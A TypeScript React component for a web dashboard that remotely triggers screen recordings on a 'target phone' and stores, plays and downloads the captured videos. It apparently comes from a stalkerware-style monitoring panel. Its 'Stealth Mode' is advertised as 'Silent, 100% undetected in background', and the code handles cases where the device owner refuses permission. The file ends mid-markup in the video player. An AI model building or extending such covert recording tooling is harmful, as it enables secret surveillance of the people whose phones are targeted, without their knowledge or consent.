"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    Video, Square, Play, Clock, Download, Trash2,
    AlertTriangle, CheckCircle, AlertCircle, X,
    Zap, Shield, Repeat2, ChevronRight, Monitor,
    Wifi, Battery, Smartphone, EyeOff, Sparkles,
    Info, Film, Lock, RefreshCw
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
    onTriggerOffline?: (deviceName?: string) => void;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
    mode?: string;
}

const DURATIONS = [
    { label: '2m',  value: 120 },
    { label: '5m',  value: 300 },
    { label: '10m', value: 600 },
];

const STORAGE_KEY = (deviceId: string) => `asml_recs_${deviceId}`;
const MODE_STORAGE_KEY = 'asml_screen_rec_mode';
const DURATION_STORAGE_KEY = 'asml_screen_rec_duration';
const PENDING_STORAGE_KEY = (deviceId: string) => `asml_rec_pending_${deviceId}`;
const STEALTH_SEEN_KEY = 'asml_stealth_notice_seen';

function fmt(ms: number) {
    const s = Math.floor(ms / 1000);
    return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
}

function fmtReason(r: string) {
    if (r === 'duration_complete') return 'Completed';
    if (r === 'manual_stop')      return 'Stopped';
    if (r === 'token_released')   return 'Token released';
    if (r === 'encoder_error')    return 'Error';
    return 'Done';
}

function timeAgo(ts: number) {
    const d = Math.floor((Date.now() - ts) / 1000);
    if (d < 60)   return 'Just now';
    if (d < 3600) return `${Math.floor(d / 60)}m ago`;
    if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
    return new Date(ts).toLocaleDateString();
}

export default function ScreenRecordView({
    socket, userUuid, selectedDeviceId, isOnline, deviceName, onTriggerOffline
}: ScreenRecordViewProps) {

    const [hasToken,     setHasToken]     = useState<boolean | null>(null);
    const [isRecording,  setIsRecording]  = useState(false);
    const [pendingRec,   setPendingRec]   = useState(false);
    
    // Persist mode & duration across page refreshes (default is simple)
    const [recMode, setRecMode] = useState<'stealth' | 'simple'>('simple');
    const [recDuration, setRecDuration] = useState<number>(300);

    const [customMin,    setCustomMin]    = useState('');
    const [showCustom,   setShowCustom]   = useState(false);
    const [isUnlimited,  setIsUnlimited]  = useState(false);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs,   setRecTotalMs]   = useState(0);
    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
    const [toast,        setToast]        = useState<{ type: 'ok'|'warn'|'err'; text: string } | null>(null);
    const [playingRec,   setPlayingRec]   = useState<SavedRecording | null>(null);
    const [showSimpleWarn, setShowSimpleWarn] = useState(false);
    const [showUnlimWarn,  setShowUnlimWarn]  = useState(false);
    const [showStealthNoticeModal, setShowStealthNoticeModal] = useState(false);
    const [isSaving,       setIsSaving]       = useState(false);

    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;
    const recordingModeRef = useRef<'stealth' | 'simple'>('simple');
    recordingModeRef.current = recMode;

    // ── Toast helper ──────────────────────────────────────────────────────────
    const showToast = useCallback((type: 'ok'|'warn'|'err', text: string, ms = 4000) => {
        setToast({ type, text });
        setTimeout(() => setToast(null), ms);
    }, []);

    // ── Load cached mode, duration, and pending state on mount ────────────────
    useEffect(() => {
        if (typeof window === 'undefined') return;
        try {
            const savedMode = localStorage.getItem(MODE_STORAGE_KEY);
            if (savedMode === 'stealth' || savedMode === 'simple') {
                setRecMode(savedMode);
            } else {
                setRecMode('simple');
            }
            const savedDur = localStorage.getItem(DURATION_STORAGE_KEY);
            if (savedDur) {
                const parsed = parseInt(savedDur, 10);
                if (!isNaN(parsed) && parsed > 0) {
                    setRecDuration(parsed);
                }
            }
        } catch {}
    }, []);

    // ── Persist recordings in localStorage ────────────────────────────────────
    useEffect(() => {
        if (!selectedDeviceId) return;
        try {
            const raw = localStorage.getItem(STORAGE_KEY(selectedDeviceId));
            if (raw) setSavedRecs(JSON.parse(raw));

            // Restore pending queue state if page was refreshed within 3 minutes
            const pendingRaw = localStorage.getItem(PENDING_STORAGE_KEY(selectedDeviceId));
            if (pendingRaw) {
                const p = JSON.parse(pendingRaw);
                if (Date.now() - (p.timestamp || 0) < 3 * 60 * 1000) {
                    setPendingRec(true);
                    setRecTotalMs((p.duration || 300) * 1000);
                } else {
                    localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId));
                }
            }
        } catch {}
    }, [selectedDeviceId]);

    const persist = useCallback((recs: SavedRecording[], devId: string) => {
        try { localStorage.setItem(STORAGE_KEY(devId), JSON.stringify(recs.slice(0, 20))); } catch {}
    }, []);

    const addRec = useCallback((rec: SavedRecording) => {
        setSavedRecs(prev => {
            const next = [rec, ...prev.slice(0, 19)];
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    const deleteRec = useCallback((id: string) => {
        setSavedRecs(prev => {
            const next = prev.filter(r => r.id !== id);
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    // ── Mode switcher with persistence and Stealth explanation modal ──────────
    const handleSelectMode = (mode: 'stealth' | 'simple') => {
        setRecMode(mode);
        if (typeof window !== 'undefined') {
            try { localStorage.setItem(MODE_STORAGE_KEY, mode); } catch {}
        }
        if (mode === 'stealth') {
            // Popup informing user that stealth takes time
            setShowStealthNoticeModal(true);
        }
    };

    const handleSelectDuration = (val: number) => {
        setRecDuration(val);
        setIsUnlimited(false);
        setShowCustom(false);
        setCustomMin('');
        if (typeof window !== 'undefined') {
            try { localStorage.setItem(DURATION_STORAGE_KEY, String(val)); } catch {}
        }
    };

    // ── Socket ────────────────────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;
        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        }

        const onStatus = (data: any) => {
            if (!data) return;
            if (data.hasToken !== undefined) setHasToken(!!data.hasToken);
            switch (data.status) {
                case 'token_needed':
                    setHasToken(false);
                    break;
                case 'authorized':
                    setHasToken(true);
                    break;
                case 'recording_started':
                    setIsRecording(true);
                    setPendingRec(false);
                    setRecElapsedMs(0);
                    setRecTotalMs((data.durationSec || 0) * 1000);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    showToast('ok', '● Screen recording in progress');
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false);
                    setIsRecording(false);
                    setPendingRec(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    break;
                case 'stealth_timeout':
                    setPendingRec(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    showToast('warn', 'Queue timeout — No screen activity detected', 6000);
                    break;
                case 'denied':
                    setIsRecording(false);
                    setPendingRec(false);
                    setHasToken(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    showToast('err', data.error || 'Permission denied on device');
                    break;
                case 'permission_never_granted':
                    setIsRecording(false);
                    setPendingRec(false);
                    setHasToken(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    showToast('err', 'Device denied twice — Silent recording cancelled', 8000);
                    break;
            }
        };

        const onProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true);
            setPendingRec(false);
            setRecElapsedMs(data.elapsedMs || 0);
            setRecTotalMs(data.totalMs || 0);
        };

        const onComplete = (data: any) => {
            if (!data) return;
            setIsSaving(false);
            setIsRecording(false);
            setPendingRec(false);
            setRecElapsedMs(0);
            setRecTotalMs(0);
            if (selectedDeviceId) {
                try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
            }
            if (data.url) {
                addRec({
                    id: `rec_${Date.now()}`,
                    url: data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs || 0,
                    totalMs:   data.totalMs   || 0,
                    reason:    data.reason    || 'unknown',
                    mode:      data.mode || recordingModeRef.current || recMode || 'stealth'
                });
                showToast('ok', `Saved recording — ${fmt(data.elapsedMs || 0)}`);
            }
        };

        socket.on('screen_status',       onStatus);
        socket.on('screen_rec_progress', onProgress);
        socket.on('screen_rec_complete', onComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_status',       onStatus);
            socket.off('screen_rec_progress', onProgress);
            socket.off('screen_rec_complete', onComplete);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid, showToast, addRec]);

    // ── Actions ───────────────────────────────────────────────────────────────
    const fireStart = useCallback(() => {
        if (!selectedDeviceId || !socket) return;
        const duration = isUnlimited ? 86400 : recDuration;
        setPendingRec(true);
        setRecElapsedMs(0);
        setRecTotalMs(duration * 1000);

        try {
            localStorage.setItem(PENDING_STORAGE_KEY(selectedDeviceId), JSON.stringify({
                mode: recMode,
                timestamp: Date.now(),
                duration
            }));
        } catch {}

        recordingModeRef.current = recMode;
        socket.emit('screen_record_start', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            duration,
            mode: recMode
        });

        if (recMode === 'stealth') {
            showToast('ok', 'In Queue — Waiting for screen activity (takes a moment)');
            // Also show modal if user hasn't seen it yet
            if (typeof window !== 'undefined') {
                const seen = localStorage.getItem(STEALTH_SEEN_KEY);
                if (!seen) setShowStealthNoticeModal(true);
            }
        } else {
            showToast('warn', 'Prompt sent to target phone...');
        }
    }, [selectedDeviceId, socket, userUuid, recMode, recDuration, isUnlimited, showToast]);

    const handleStart = () => {
        if (!selectedDeviceId) return;
        if (!isOnline) {
            onTriggerOffline?.(deviceName);
            return;
        }
        if (!socket || isRecording || pendingRec) return;
        if (recMode === 'simple') { setShowSimpleWarn(true); return; }
        if (isUnlimited)          { setShowUnlimWarn(true); return; }
        fireStart();
    };

    const handleStop = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        if (isRecording) {
            setIsSaving(true);
        }
        setIsRecording(false);
        setPendingRec(false);
        if (selectedDeviceId) {
            try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
        }
    };

    const pct = recTotalMs > 0 ? Math.min((recElapsedMs / recTotalMs) * 100, 100) : 0;

    // ── Render ────────────────────────────────────────────────────────────────
    return (
        <div className="relative w-full max-w-xl mx-auto space-y-3 pb-24 px-3 sm:px-0">

            {/* ── Theme-aligned Toast / In Queue Popup (Centered) ── */}
            {toast && (
                <div 
                    className="fixed inset-0 z-[800] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-200"
                    onClick={() => setToast(null)}
                >
                    <div 
                        className={`clay-card w-full max-w-sm p-4 rounded-2xl flex items-center gap-3 border shadow-[0_20px_60px_rgba(0,0,0,0.95)] animate-in zoom-in-95 duration-200 ${
                            toast.type === 'err'
                                ? 'bg-[#181214]/95 border-rose-500/40 text-rose-200 shadow-[0_10px_35px_rgba(244,63,94,0.25)]'
                                : 'bg-[#141519]/95 border-orange-500/40 text-white shadow-[0_15px_40px_rgba(249,115,22,0.25)] ring-1 ring-orange-500/20'
                        }`}
                        onClick={e => e.stopPropagation()}
                    >
                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
                            toast.type === 'err'
                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                                : 'bg-orange-500/20 text-orange-400 border border-orange-500/30 shadow-[0_0_12px_rgba(249,115,22,0.35)]'
                        }`}>
                            {toast.type === 'err' ? (
                                <AlertCircle size={18} />
                            ) : toast.text.toLowerCase().includes('queue') ? (
                                <Clock size={18} className="animate-spin text-orange-400" />
                            ) : (
                                <Sparkles size={18} className="text-orange-400" />
                            )}
                        </div>
                        <div className="flex-1 min-w-0 pr-1">
                            <p className="font-bold text-white text-xs tracking-tight truncate">
                                {toast.text.toLowerCase().includes('queue') ? 'Recording In Queue' : 'Screen Notice'}
                            </p>
                            <p className="text-[11px] text-white/70 truncate mt-0.5 font-mono">
                                {toast.text}
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={() => setToast(null)}
                            className="p-1.5 rounded-lg text-white/40 hover:text-white hover:bg-white/10 transition-colors cursor-pointer shrink-0"
                            aria-label="Close"
                        >
                            <X size={15} />
                        </button>
                    </div>
                </div>
            )}

            {/* ── Header & Device Pill ───────────────────────────────────────── */}
            <div className="clay-card p-3 sm:p-4 flex items-center justify-between gap-3 border border-orange-500/20">
                <div className="flex items-center gap-3 min-w-0">
                    <div className="clay-icon-pod w-10 h-10 rounded-2xl flex items-center justify-center text-orange-400 shrink-0">
                        <Monitor className="w-5 h-5 text-orange-400" />
                    </div>
                    <div className="min-w-0">
                        <h2 className="text-sm sm:text-base font-bold text-white tracking-tight flex items-center gap-2 truncate">
                            <span>Screen Mirror & Capture</span>
                            <span className="w-2 h-2 rounded-full bg-orange-400 shadow-[0_0_8px_#f97316] animate-pulse shrink-0" />
                        </h2>
                        <div className="flex items-center gap-2 text-xs text-white/50 truncate mt-0.5">
                            <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${isOnline ? 'bg-orange-400' : 'bg-white/20'}`}/>
                            <span className="truncate">{deviceName || 'Target Phone'}</span>
                        </div>
                    </div>
                </div>

                <div className="shrink-0 flex items-center gap-2">
                    {hasToken !== null && (
                        <span className={`text-[10px] font-mono font-semibold px-2.5 py-1 rounded-full border ${
                            hasToken 
                                ? 'bg-orange-500/15 border-orange-500/35 text-orange-400 shadow-[0_0_10px_rgba(249,115,22,0.2)]' 
                                : 'bg-white/5 border-white/10 text-white/40'
                        }`}>
                            {hasToken ? 'Live Token' : 'Standby'}
                        </span>
                    )}
                </div>
            </div>

            {/* ── Mode Selection ─────────────────────────────────────────────── */}
            <div className="clay-card p-3.5 space-y-2 border border-white/5">
                <div className="flex items-center justify-between px-0.5">
                    <p className="text-[10px] font-bold uppercase tracking-widest text-white/40 font-mono">
                        Recording Mode
                    </p>
                    <span className="text-[10px] text-orange-400/80 font-mono">
                        {recMode === 'stealth' ? 'Silent Mode Active' : 'Interactive Mode'}
                    </span>
                </div>

                <div className="grid grid-cols-2 gap-2.5">
                    {([['stealth', 'Stealth Mode', Shield, 'Silent, 100% undetected in background'], ['simple', 'Standard Mode', Zap, 'Interactive prompt on device screen']] as const).map(([val, label, Icon, desc]) => (
                        <button key={val}
                            type="button"
                            onClick={() => handleSelectMode(val)}
                            disabled={isRecording || pendingRec}
                            className={`group relative p-3 rounded-2xl text-left transition-all disabled:opacity-40 border cursor-pointer overflow-hidden ${
                                recMode === val
                                    ? 'bg-orange-500/15 border-orange-500/50 shadow-[0_0_20px_rgba(249,115,22,0.15)] ring-1 ring-orange-500/30'
                                    : 'bg-white/[0.03] border-white/[0.08] hover:border-white/20 hover:bg-white/[0.05]'
                            }`}
                        >
                            <div className="flex items-center justify-between mb-1.5">
                                <Icon size={16} className={recMode === val ? 'text-orange-400' : 'text-white/30'} />
                                {recMode === val && (
                                    <span className="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded bg-orange-500/20 text-orange-400 border border-orange-500/30">
                                        Selected
                                    </span>
                                )}
                            </div>
                            <p className={`text-xs font-bold ${recMode === val ? 'text-white' : 'text-white/50'}`}>{label}</p>
                            <p className="text-[10px] text-white/40 mt-0.5 leading-relaxed">
                                {desc}
                            </p>
                        </button>
                    ))}
                </div>
            </div>

            {/* ── Duration Selection ─────────────────────────────────────────── */}
            <div className="clay-card p-3.5 space-y-2.5 border border-white/5">
                <p className="text-[10px] font-bold uppercase tracking-widest text-white/40 px-0.5 font-mono">
                    Capture Duration
                </p>
                <div className="flex gap-2">
                    {DURATIONS.map(d => (
                        <button key={d.value}
                            type="button"
                            onClick={() => handleSelectDuration(d.value)}
                            disabled={isRecording || pendingRec}
                            className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 cursor-pointer ${
                                recDuration === d.value && !showCustom && !isUnlimited
                                    ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.35)]'
                                    : 'bg-white/5 text-white/50 hover:text-white/80 border border-white/5'
                            }`}
                        >{d.label}</button>
                    ))}
                    <button
                        type="button"
                        onClick={() => { setShowCustom(true); setIsUnlimited(false); setRecDuration(0); }}
                        disabled={isRecording || pendingRec}
                        className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 cursor-pointer ${
                            showCustom 
                                ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.35)]' 
                                : 'bg-white/5 text-white/50 hover:text-white/80 border border-white/5'
                        }`}
                    >Custom</button>
                </div>

                {showCustom && (
                    <div className="flex items-center gap-2 bg-black/40 rounded-xl px-3 py-2 border border-orange-500/30">
                        <input
                            type="number" min={1} max={10} value={customMin}
                            onChange={e => {
                                setCustomMin(e.target.value);
                                const n = parseInt(e.target.value, 10);
                                if (!isNaN(n) && n >= 1 && n <= 10) {
                                    setRecDuration(n * 60);
                                    try { localStorage.setItem(DURATION_STORAGE_KEY, String(n * 60)); } catch {}
                                }
                            }}
                            placeholder="1–10"
                            className="bg-transparent text-white text-sm font-semibold w-12 outline-none placeholder:text-white/20"
                        />
                        <span className="text-[10px] text-white/30 font-mono">minutes (max 10)</span>
                        {recDuration > 0 && <span className="ml-auto text-xs text-orange-400 font-bold font-mono">{recDuration / 60}m</span>}
                    </div>
                )}

                <button
                    type="button"
                    onClick={() => { setIsUnlimited(!isUnlimited); setShowCustom(false); setCustomMin(''); }}
                    disabled={isRecording || pendingRec}
                    className={`w-full py-2 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 transition-all disabled:opacity-40 border cursor-pointer ${
                        isUnlimited
                            ? 'bg-amber-500/15 border-amber-500/40 text-amber-300'
                            : 'bg-white/[0.02] border-white/[0.06] text-white/35 hover:text-white/60'
                    }`}
                >
                    <Repeat2 size={13}/>
                    <span>Continuous (Until session ends)</span>
                    {isUnlimited && <span className="text-[10px] text-amber-400/70 ml-1 font-mono">— Auto loop</span>}
                </button>
            </div>

            {/* ── Main Action / Status Card ──────────────────────────────────── */}
            <div className="clay-card p-3.5 border border-orange-500/20">
                {!isRecording && !pendingRec ? (
                    <div className="space-y-2">
                        <button
                            type="button"
                            onClick={handleStart}
                            disabled={!selectedDeviceId || (showCustom && recDuration <= 0)}
                            className="clay-cta-button w-full py-3.5 rounded-2xl font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all disabled:opacity-30 disabled:cursor-not-allowed shadow-[0_4px_24px_rgba(249,115,22,0.4)] cursor-pointer hover:scale-[1.01] active:scale-[0.99]"
                        >
                            <Play size={15} className="fill-current"/>
                            <span>
                                {recMode === 'stealth' ? 'Start Silent Recording' : 'Start Recording'}
                            </span>
                        </button>
                    </div>

                ) : pendingRec && !isRecording ? (
                    <div className="space-y-2.5">
                        <div className="flex items-center gap-3 py-3.5 px-4 rounded-2xl bg-amber-500/10 border border-amber-500/30">
                            <Clock size={16} className="text-amber-400 animate-spin shrink-0"/>
                            <div className="flex-1 min-w-0">
                                <span className="text-xs font-bold text-amber-300 block">
                                    {recMode === 'stealth' ? 'In Queue — Waiting for Screen Activity...' : 'Waiting for phone permission...'}
                                </span>
                                <span className="text-[10px] text-amber-200/50 font-mono block mt-0.5">
                                    {recMode === 'stealth' 
                                        ? 'Silent link active • Recording will start automatically' 
                                        : 'Waiting for device user to press Accept'}
                                </span>
                            </div>
                        </div>
                        <button 
                            type="button"
                            onClick={handleStop}
                            className="w-full py-2.5 rounded-xl text-xs font-bold text-rose-300 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/25 transition-all cursor-pointer"
                        >
                            Cancel Queue
                        </button>
                    </div>

                ) : (
                    <div className="space-y-3">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse shadow-[0_0_10px_#f43f5e]"/>
                                <span className="text-xs font-bold text-white tracking-wide">Live Recording Active</span>
                            </div>
                            <span className="text-xs font-mono font-bold text-rose-400">
                                {fmt(recElapsedMs)}{recTotalMs > 0 && !isUnlimited ? ` / ${fmt(recTotalMs)}` : ''}
                            </span>
                        </div>

                        {!isUnlimited && recTotalMs > 0 && (
                            <div className="h-1.5 rounded-full bg-white/10 overflow-hidden">
                                <div className="h-full rounded-full bg-gradient-to-r from-orange-500 to-amber-400 transition-all duration-1000" style={{ width: `${pct}%` }}/>
                            </div>
                        )}

                        {isSaving ? (
                            <div className="w-full py-3 rounded-xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center gap-2.5 text-orange-300 font-bold text-xs animate-pulse">
                                <RefreshCw className="w-4 h-4 text-orange-400 animate-spin" />
                                <span>Saving & Finalizing Video...</span>
                            </div>
                        ) : (
                            <button 
                                type="button"
                                onClick={handleStop}
                                className="w-full py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 bg-rose-500/20 border border-rose-500/40 text-rose-300 hover:bg-rose-500/30 transition-all cursor-pointer shadow-lg"
                            >
                                <Square size={13} className="fill-current"/> 
                                <span>Stop & Save Recording</span>
                            </button>
                        )}
                    </div>
                )}
            </div>

            {/* ── Recordings & Active Queue Section ──────────────────────────── */}
            <div className="clay-card overflow-hidden border border-white/5">
                <div className="px-4 py-3 flex items-center justify-between border-b border-white/[0.06] bg-white/[0.01]">
                    <span className="text-[11px] font-bold text-white/40 uppercase tracking-wider font-mono">
                        Recordings & Queue ({savedRecs.length + (pendingRec || isRecording ? 1 : 0)})
                    </span>
                    {savedRecs.length > 0 && (
                        <button 
                            type="button"
                            onClick={() => { setSavedRecs([]); if (selectedDeviceId) persist([], selectedDeviceId); }}
                            className="text-[10px] text-white/30 hover:text-rose-400 transition-colors font-mono cursor-pointer"
                        >
                            Clear all
                        </button>
                    )}
                </div>

                {/* In Queue active indicator item */}
                {pendingRec && (
                    <div className="flex items-center gap-3 px-4 py-3.5 bg-amber-500/10 border-b border-amber-500/20 animate-pulse">
                        <div className="w-9 h-9 rounded-xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
                            <Clock size={16} className="animate-spin" />
                        </div>
                        <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                                <span className="text-xs font-bold text-amber-300">In Queue...</span>
                                <span className="text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase bg-amber-500/20 text-amber-300 font-mono">
                                    Waiting
                                </span>
                            </div>
                            <p className="text-[10px] text-white/50 mt-0.5 truncate">
                                Waiting for screen activity ({isUnlimited ? 'Continuous' : `${recDuration / 60}m`})
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={handleStop}
                            className="px-2.5 py-1 rounded-lg text-[10px] font-semibold text-rose-300 bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 transition-all cursor-pointer"
                        >
                            Cancel
                        </button>
                    </div>
                )}

                {/* Live recording item */}
                {isRecording && (
                    <div className="flex items-center gap-3 px-4 py-3.5 bg-rose-500/10 border-b border-rose-500/20">
                        <div className="w-9 h-9 rounded-xl bg-rose-500/20 border border-rose-500/30 flex items-center justify-center text-rose-400 shrink-0">
                            <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping" />
                        </div>
                        <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                                <span className="text-xs font-bold text-white">Live Screen Recording</span>
                                <span className="text-[9px] px-1.5 py-0.5 rounded-md font-semibold font-mono bg-rose-500/20 text-rose-300">
                                    {fmt(recElapsedMs)}
                                </span>
                            </div>
                            <p className="text-[10px] text-white/50 mt-0.5 truncate">
                                Streaming live screen video to device storage
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={handleStop}
                            className="px-2.5 py-1 rounded-lg text-[10px] font-bold text-white bg-rose-600 hover:bg-rose-700 transition-all cursor-pointer"
                        >
                            Stop
                        </button>
                    </div>
                )}

                {/* Saving / Finalizing progress item */}
                {isSaving && (
                    <div className="flex items-center gap-3 px-4 py-3.5 bg-orange-500/10 border-b border-orange-500/20 animate-pulse">
                        <div className="w-9 h-9 rounded-xl bg-orange-500/20 border border-orange-500/30 flex items-center justify-center text-orange-400 shrink-0">
                            <RefreshCw size={16} className="animate-spin text-orange-400" />
                        </div>
                        <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                                <span className="text-xs font-bold text-white">Saving Recording...</span>
                                <span className="text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase bg-orange-500/20 text-orange-400 font-mono">
                                    Finalizing
                                </span>
                            </div>
                            <p className="text-[10px] text-white/50 mt-0.5 truncate">
                                Processing and saving mobile video capture to list
                            </p>
                        </div>
                    </div>
                )}

                {/* Saved list */}
                {savedRecs.length > 0 ? (
                    <div className="divide-y divide-white/[0.04]">
                        {savedRecs.map(rec => (
                            <div key={rec.id} className="flex items-center gap-3 px-4 py-3 hover:bg-white/[0.03] transition-colors group">
                                {/* Play in mobile phone frame */}
                                <button
                                    type="button"
                                    onClick={() => setPlayingRec(rec)}
                                    className="w-9 h-9 rounded-xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center text-orange-400 hover:bg-orange-500 hover:text-white transition-all shrink-0 cursor-pointer shadow-[0_0_12px_rgba(249,115,22,0.2)]"
                                    title="Play recording in mobile frame"
                                >
                                    <Play size={13} className="fill-current ml-0.5"/>
                                </button>

                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center gap-2">
                                        <span className="text-xs font-bold text-white/80 font-mono">{fmt(rec.elapsedMs)}</span>
                                        <span className={`text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase tracking-wide font-mono ${
                                            rec.mode === 'simple'
                                                ? 'bg-white/10 text-white/40 border border-white/10'
                                                : 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                                        }`}>
                                            {rec.mode === 'simple' ? 'Standard' : 'Silent Rec'}
                                        </span>
                                    </div>
                                    <p className="text-[10px] text-white/35 mt-0.5 font-mono">
                                        {timeAgo(rec.timestamp)} · {fmtReason(rec.reason)}
                                    </p>
                                </div>

                                <div className="flex items-center gap-1 opacity-70 group-hover:opacity-100 transition-opacity">
                                    <a href={rec.url} download={`screen_${rec.id}.mp4`}
                                        className="p-1.5 rounded-lg text-white/40 hover:text-white hover:bg-white/10 transition-all cursor-pointer"
                                        title="Download"
                                    ><Download size={14}/></a>
                                    <button 
                                        type="button"
                                        onClick={() => deleteRec(rec.id)}
                                        className="p-1.5 rounded-lg text-white/40 hover:text-rose-400 hover:bg-rose-500/10 transition-all cursor-pointer"
                                        title="Delete"
                                    ><Trash2 size={14}/></button>
                                </div>
                            </div>
                        ))}
                    </div>
                ) : !isRecording && !pendingRec ? (
                    <div className="py-12 flex flex-col items-center gap-2 text-center">
                        <div className="w-12 h-12 rounded-2xl bg-white/[0.03] border border-white/[0.06] flex items-center justify-center text-white/20">
                            <Film size={20}/>
                        </div>
                        <p className="text-xs font-semibold text-white/40">No recordings yet</p>
                        <p className="text-[11px] text-white/25 font-mono">
                            Start a recording to capture mobile screen activity
                        </p>
                    </div>
                ) : null}
            </div>

            {/* ── Realistic Smartphone Frame Video Player Modal ───────────────── */}
            {playingRec && (
                <div
                    className="fixed inset-0 z-[750] bg-black/85 backdrop-blur-md flex items-center justify-center p-3 sm:p-4 overflow-y-auto animate-in fade-in duration-200"
                    onClick={() => setPlayingRec(null)}
                >
                    <div
                        className="relative w-full max-w-[340px] flex flex-col items-center animate-in zoom-in-95 duration-200 my-auto"
                        onClick={e => e.stopPropagation()}
                    >
                        {/* Header bar above mobile frame */}
                        <div className="w-full flex items-center justify-between pb-3 px-1 text-white">
                            <div className="min-w-0">
                                <div className="flex items-center gap-1.5">
                                    <Smartphone size={15} className="text-orange-400 shrink-0" />
                                    <span className="text-xs font-bold text-white tracking-tight truncate">
                                        Mobile Screen Playback
                                    </span>
                                </div>
                                <p className="text-[10px] text-white/50 font-mono truncate mt-0.5">
                                    {fmt(playingRec.elapsedMs)} duration • {timeAgo(playingRec.timestamp)}
                                </p>
                            </div>
                            <div className="flex items-center gap-2 shrink-0">
                                <a
                                    href={playingRec.url}
                                    download={`screen_rec_${playingRec.id}.mp4`}
                                    className="p-2 rounded-xl bg-white/10 hover:bg-orange-500 hover:text-white text-white/70 transition-all cursor-pointer"
                                    title="Download recording"
                                >
                                    <Download size={15} />
                                </a>
                                <button
                                    type="button"
                                    onClick={() => setPlayingRec(null)}
                                    className="p-2 rounded-xl bg-white/10 hover:bg-white/20 text-white/70 hover:text-white transition-all cursor-pointer"
                                    aria-label="Close"
                                >
                                    <X size={15} />
                                </button>
                            </div>
                        </div>

                        {/* Smartphone Chassis Mockup */}
                        <div className="relative w-full rounded-[44px] bg-[#141519] p-3.5 shadow-[0_25px_80px_rgba(0,0,0,0.95),0_0_0_4px_#272932,inset_0_1px_2px_rgba(255,255,255,0.15)] border border-white/10">
                            {/* Outer physical volume & power button accents */}
                            <div className="absolute -left-[5px] top-24 w-[2.5px] h-8 bg-[#373a44] rounded-l" />
                            <div className="absolute -left-[5px] top-36 w-[2.5px] h-8 bg-[#373a44] rounded-l" />
                            <div className="absolute -right-[5px] top-28 w-[2.5px] h-11 bg-[#373a44] rounded-r" />

